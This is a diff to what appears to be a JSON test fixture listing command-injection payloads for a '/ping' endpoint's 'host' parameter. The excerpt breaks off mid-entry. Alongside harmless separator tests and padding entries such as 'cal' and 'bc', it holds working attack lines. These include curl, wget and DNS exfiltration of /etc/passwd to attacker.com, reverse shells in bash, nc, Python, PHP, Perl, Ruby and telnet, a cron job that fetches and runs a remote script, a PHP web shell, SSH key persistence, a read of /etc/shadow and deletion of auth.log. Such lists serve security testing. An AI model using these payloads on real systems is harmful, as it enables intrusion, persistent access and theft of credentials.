@@ -1,5 +1,6 @@
-{
-    "name": "Command Injection via Query Param",
+[
+  {
+    "name": "Command Injection via Semicolon",
     "description": "Inject OS command using semicolon separator",
     "method": "GET",
     "endpoint": "/ping",
@@ -9,4 +10,1445 @@
     "parameters": {
       "host": "127.0.0.1; cat /etc/passwd"
     }
+  },
+  {
+    "name": "Command Injection via Double Ampersand",
+    "description": "Inject command using && logical operator",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1 && whoami"
+    }
+  },
+  {
+    "name": "Command Injection via Pipe",
+    "description": "Inject command using pipe operator",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1 | id"
+    }
+  },
+  {
+    "name": "Command Injection via Newline",
+    "description": "Inject command using newline character",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1\\nid"
+    }
+  },
+  {
+    "name": "Command Injection via Backtick",
+    "description": "Inject command using backticks",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1`id`"
+    }
+  },
+  {
+    "name": "Command Injection via Dollar Parentheses",
+    "description": "Inject command using $(command) syntax",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1$(id)"
+    }
+  },
+  {
+    "name": "Command Injection via OR Operator",
+    "description": "Inject command using || logical operator",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1 || uname -a"
+    }
+  },
+  {
+    "name": "Command Injection with Substitution",
+    "description": "Command substitution with backticks",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "`cat /etc/passwd`"
+    }
+  },
+  {
+    "name": "Command Injection with Sleep",
+    "description": "Time-based blind injection using sleep",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; sleep 5"
+    }
+  },
+  {
+    "name": "Command Injection with Curl",
+    "description": "Exfiltrate data using curl",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; curl http://attacker.com/?data=$(cat /etc/passwd)"
+    }
+  },
+  {
+    "name": "Command Injection with Wget",
+    "description": "Exfiltrate data using wget",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; wget http://attacker.com/ --post-file=/etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Netcat",
+    "description": "Reverse shell using netcat",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; nc attacker.com 4444 -e /bin/sh"
+    }
+  },
+  {
+    "name": "Command Injection with Bash",
+    "description": "Reverse shell using bash",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+    }
+  },
+  {
+    "name": "Command Injection with Python",
+    "description": "Reverse shell using python",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    }
+  },
+  {
+    "name": "Command Injection with PHP",
+    "description": "Reverse shell using php",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    }
+  },
+  {
+    "name": "Command Injection with Perl",
+    "description": "Reverse shell using perl",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    }
+  },
+  {
+    "name": "Command Injection with Ruby",
+    "description": "Reverse shell using ruby",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    }
+  },
+  {
+    "name": "Command Injection with Telnet",
+    "description": "Reverse shell using telnet",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; telnet attacker.com 4444 | /bin/sh | telnet attacker.com 4445"
+    }
+  },
+  {
+    "name": "Command Injection with SSH",
+    "description": "SSH tunnel for data exfiltration",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; ssh attacker@attacker.com \"cat /etc/passwd\" > stolen_data.txt"
+    }
+  },
+  {
+    "name": "Command Injection with DNS Exfiltration",
+    "description": "Exfiltrate data via DNS queries",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; dig @attacker.com $(cat /etc/passwd | base64).evil.com"
+    }
+  },
+  {
+    "name": "Command Injection with File Read",
+    "description": "Read sensitive file contents",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; cat /etc/shadow"
+    }
+  },
+  {
+    "name": "Command Injection with File Write",
+    "description": "Write to sensitive file",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo 'malicious content' > /tmp/backdoor.sh"
+    }
+  },
+  {
+    "name": "Command Injection with File Append",
+    "description": "Append to sensitive file",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo 'malicious content' >> /etc/crontab"
+    }
+  },
+  {
+    "name": "Command Injection with Directory Listing",
+    "description": "List directory contents",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; ls -la /"
+    }
+  },
+  {
+    "name": "Command Injection with Process Listing",
+    "description": "List running processes",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; ps aux"
+    }
+  },
+  {
+    "name": "Command Injection with Network Info",
+    "description": "Get network information",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; ifconfig"
+    }
+  },
+  {
+    "name": "Command Injection with System Info",
+    "description": "Get system information",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; uname -a"
+    }
+  },
+  {
+    "name": "Command Injection with User Info",
+    "description": "Get user information",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; id"
+    }
+  },
+  {
+    "name": "Command Injection with Environment",
+    "description": "Get environment variables",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; env"
+    }
+  },
+  {
+    "name": "Command Injection with History",
+    "description": "Get command history",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; history"
+    }
+  },
+  {
+    "name": "Command Injection with Cron Job",
+    "description": "Create malicious cron job",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo '* * * * * curl http://attacker.com/shell.sh | bash' | crontab -"
+    }
+  },
+  {
+    "name": "Command Injection with Web Shell",
+    "description": "Create web shell",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php"
+    }
+  },
+  {
+    "name": "Command Injection with SSH Key",
+    "description": "Add SSH key for persistence",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys"
+    }
+  },
+  {
+    "name": "Command Injection with Tarball",
+    "description": "Create backup of sensitive files",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; tar -czf /tmp/stolen_data.tar.gz /etc/passwd /etc/shadow"
+    }
+  },
+  {
+    "name": "Command Injection with Base64",
+    "description": "Encode data in base64",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; cat /etc/passwd | base64"
+    }
+  },
+  {
+    "name": "Command Injection with Hexdump",
+    "description": "Hex dump of sensitive file",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; hexdump -C /etc/shadow"
+    }
+  },
+  {
+    "name": "Command Injection with Strings",
+    "description": "Extract strings from binary",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; strings /bin/ls"
+    }
+  },
+  {
+    "name": "Command Injection with Find",
+    "description": "Find sensitive files",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; find / -name '*.key' -o -name '*.pem' -o -name '*.db'"
+    }
+  },
+  {
+    "name": "Command Injection with Grep",
+    "description": "Search for sensitive data",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; grep -r 'password' /etc/"
+    }
+  },
+  {
+    "name": "Command Injection with Awk",
+    "description": "Process data with awk",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; awk -F: '{print $1}' /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Sed",
+    "description": "Modify files with sed",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; sed -i 's/root/toor/' /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Cut",
+    "description": "Extract specific fields",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; cut -d: -f1 /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Sort",
+    "description": "Sort data",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; sort /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Uniq",
+    "description": "Find unique entries",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; uniq /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with WC",
+    "description": "Count lines/words",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; wc -l /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Head",
+    "description": "Show first lines",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; head -10 /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Tail",
+    "description": "Show last lines",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; tail -10 /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Less",
+    "description": "View file with less",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; less /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with More",
+    "description": "View file with more",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; more /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with NL",
+    "description": "Number lines of file",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; nl /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Od",
+    "description": "Octal dump of file",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; od -c /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with XXD",
+    "description": "Hex dump with xxd",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; xxd /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with File",
+    "description": "Determine file type",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; file /bin/ls"
+    }
+  },
+  {
+    "name": "Command Injection with Stat",
+    "description": "Display file status",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; stat /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Df",
+    "description": "Disk space usage",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; df -h"
+    }
+  },
+  {
+    "name": "Command Injection with Du",
+    "description": "Directory space usage",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; du -sh /home"
+    }
+  },
+  {
+    "name": "Command Injection with Free",
+    "description": "Memory usage",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; free -m"
+    }
+  },
+  {
+    "name": "Command Injection with Top",
+    "description": "Display processes",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; top -n 1"
+    }
+  },
+  {
+    "name": "Command Injection with Htop",
+    "description": "Interactive process viewer",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; htop"
+    }
+  },
+  {
+    "name": "Command Injection with Iotop",
+    "description": "I/O usage",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; iotop"
+    }
+  },
+  {
+    "name": "Command Injection with Lsof",
+    "description": "List open files",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; lsof -i"
+    }
+  },
+  {
+    "name": "Command Injection with Netstat",
+    "description": "Network statistics",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; netstat -tulpn"
+    }
+  },
+  {
+    "name": "Command Injection with SS",
+    "description": "Socket statistics",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; ss -tulpn"
+    }
+  },
+  {
+    "name": "Command Injection with Route",
+    "description": "Routing table",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; route -n"
+    }
+  },
+  {
+    "name": "Command Injection with Arp",
+    "description": "ARP table",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; arp -a"
+    }
+  },
+  {
+    "name": "Command Injection with Iptables",
+    "description": "Firewall rules",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; iptables -L"
+    }
+  },
+  {
+    "name": "Command Injection with Uptime",
+    "description": "System uptime",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; uptime"
+    }
+  },
+  {
+    "name": "Command Injection with W",
+    "description": "Logged in users",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; w"
+    }
+  },
+  {
+    "name": "Command Injection with Who",
+    "description": "Logged in users",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; who"
+    }
+  },
+  {
+    "name": "Command Injection with Last",
+    "description": "Last logged in users",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; last"
+    }
+  },
+  {
+    "name": "Command Injection with Users",
+    "description": "List users",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; users"
+    }
+  },
+  {
+    "name": "Command Injection with Groups",
+    "description": "List groups",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; groups"
+    }
+  },
+  {
+    "name": "Command Injection with Getent",
+    "description": "Get entries from databases",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; getent passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Chmod",
+    "description": "Change file permissions",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; chmod 777 /tmp/backdoor.sh"
+    }
+  },
+  {
+    "name": "Command Injection with Chown",
+    "description": "Change file ownership",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; chown root:root /tmp/backdoor.sh"
+    }
+  },
+  {
+    "name": "Command Injection with Chgrp",
+    "description": "Change file group",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; chgrp wheel /tmp/backdoor.sh"
+    }
+  },
+  {
+    "name": "Command Injection with Ln",
+    "description": "Create symbolic link",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; ln -s /bin/bash /tmp/shell"
+    }
+  },
+  {
+    "name": "Command Injection with Cp",
+    "description": "Copy files",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; cp /etc/passwd /tmp/passwd.copy"
+    }
+  },
+  {
+    "name": "Command Injection with Mv",
+    "description": "Move files",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; mv /tmp/backdoor.sh /usr/local/bin/"
+    }
+  },
+  {
+    "name": "Command Injection with Rm",
+    "description": "Remove files",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; rm /var/log/auth.log"
+    }
+  },
+  {
+    "name": "Command Injection with Mkdir",
+    "description": "Create directory",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; mkdir /tmp/evil"
+    }
+  },
+  {
+    "name": "Command Injection with Rmdir",
+    "description": "Remove directory",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; rmdir /tmp/important"
+    }
+  },
+  {
+    "name": "Command Injection with Touch",
+    "description": "Create empty file",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; touch /tmp/flag.txt"
+    }
+  },
+  {
+    "name": "Command Injection with Echo Redirect",
+    "description": "Write to file with echo",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo 'malicious' > /tmp/file"
+    }
+  },
+  {
+    "name": "Command Injection with Cat Redirect",
+    "description": "Write to file with cat",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; cat > /tmp/file << EOF\nmalicious content\nEOF"
+    }
+  },
+  {
+    "name": "Command Injection with Tee",
+    "description": "Split output to file",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo 'malicious' | tee /tmp/file"
+    }
+  },
+  {
+    "name": "Command Injection with Date",
+    "description": "Get current date",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; date"
+    }
+  },
+  {
+    "name": "Command Injection with Cal",
+    "description": "Display calendar",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; cal"
+    }
+  },
+  {
+    "name": "Command Injection with BC",
+    "description": "Calculator",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo '2+2' | bc"
+    }
+  },
+  {
+    "name": "Command Injection with Expr",
+    "description": "Evaluate expressions",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; expr 2 + 2"
+    }
+  },
+  {
+    "name": "Command Injection with Seq",
+    "description": "Generate sequence",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; seq 1 10"
+    }
+  },
+  {
+    "name": "Command Injection with Yes",
+    "description": "Repeat string",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; yes 'malicious'"
+    }
+  },
+  {
+    "name": "Command Injection with Tr",
+    "description": "Translate characters",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo 'hello' | tr 'a-z' 'A-Z'"
+    }
+  },
+  {
+    "name": "Command Injection with Fold",
+    "description": "Wrap lines",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo 'long text' | fold -w 5"
+    }
+  },
+  {
+    "name": "Command Injection with Fmt",
+    "description": "Format text",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo 'long text' | fmt"
+    }
+  },
+  {
+    "name": "Command Injection with Pr",
+    "description": "Format for printing",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo 'text' | pr"
+    }
+  },
+  {
+    "name": "Command Injection with Column",
+    "description": "Format in columns",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo 'a b c' | column -t"
+    }
+  },
+  {
+    "name": "Command Injection with Expand",
+    "description": "Convert tabs to spaces",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo -e 'a\\tb' | expand"
+    }
+  },
+  {
+    "name": "Command Injection with Unexpand",
+    "description": "Convert spaces to tabs",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo 'a    b' | unexpand"
+    }
+  },
+  {
+    "name": "Command Injection with Split",
+    "description": "Split file into pieces",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; split -l 10 /etc/passwd /tmp/passwd_part"
+    }
+  },
+  {
+    "name": "Command Injection with Csplit",
+    "description": "Split by context",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; csplit /etc/passwd /root/"
+    }
+  },
+  {
+    "name": "Command Injection with Sum",
+    "description": "Checksum and count blocks",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; sum /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Cksum",
+    "description": "CRC checksum",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; cksum /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Md5sum",
+    "description": "MD5 checksum",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; md5sum /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Sha1sum",
+    "description": "SHA1 checksum",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; sha1sum /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Sha256sum",
+    "description": "SHA256 checksum",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; sha256sum /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Sha512sum",
+    "description": "SHA512 checksum",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; sha512sum /etc/passwd"
+    }
+  },
+  {
+    "name": "Command Injection with Base32",
+    "description": "Base32 encode/decode",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo 'secret' | base32"
+    }
+  },
+  {
+    "name": "Command Injection with Base64 URL Safe",
+    "description": "Base64 URL encoding",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; echo 'secret' | base64 -w 0"
+    }
+  },
+  {
+    "name": "Command Injection with Gzip",
+    "description": "Compress with gzip",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; gzip -c /etc/passwd > /tmp/passwd.gz"
+    }
+  },
+  {
+    "name": "Command Injection with Gunzip",
+    "description": "Decompress with gunzip",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
